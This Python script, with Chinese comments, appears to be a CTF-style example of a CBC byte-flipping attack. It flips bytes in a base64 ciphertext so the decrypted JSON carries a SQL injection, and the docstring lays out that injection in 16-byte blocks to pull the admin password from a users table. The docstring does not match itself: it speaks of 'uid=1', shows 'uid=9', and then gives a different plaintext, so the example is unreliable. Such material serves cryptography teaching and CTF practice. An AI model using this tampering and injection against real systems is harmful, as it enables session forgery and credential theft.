# -*-coding:utf-8-*-
import base64
import urllib.parse

'''
    CBC字节翻转攻击例子
    已知密文和原文，要求修改密文中uid=1达到攻击目的。

    原文：
    1234567890abcdef1234567890abcdef1234567890abcdef1234567890auid=9;123123123123
    密文(经base64编码)：
    9pzE4775q38+wGl/FqNMfFM53Ra6wTKAGUykoeioOjKzlajhqgjsPjGiXVvkFF2BwdywFE67ELLaNuU5yS0kjiuETsjG0Jdk4LiwwBst8ig=

    解题：
    原文分成16字符一组
    {"username":"adm
    aaaaaaaaaaaaaaaa
    ' or username= a
    1),(select passw
    ord from users w
    here username = 
    admin limit 0,1)
    ,localtime())#",
    "contents":"1234
    56"}
'''

enc = input()

enc = urllib.parse.unquote(enc)

_enc = list(base64.b64decode(enc))

len_iv = 16

iv = _enc[:len_iv]
cipher = _enc[len_iv:]

target = " or username=0x6"

for pos in range(0, 16):
    ch = cipher[43 - (16 - pos)] ^ ord(target[pos]) ^ ord('a')
    cipher[43 - (16 - pos)] = ch

enc2 = bytes(iv + cipher)

x_enc = base64.b64encode(enc2).decode("utf-8")
print(enc)
print(x_enc)
print(urllib.parse.quote(x_enc))
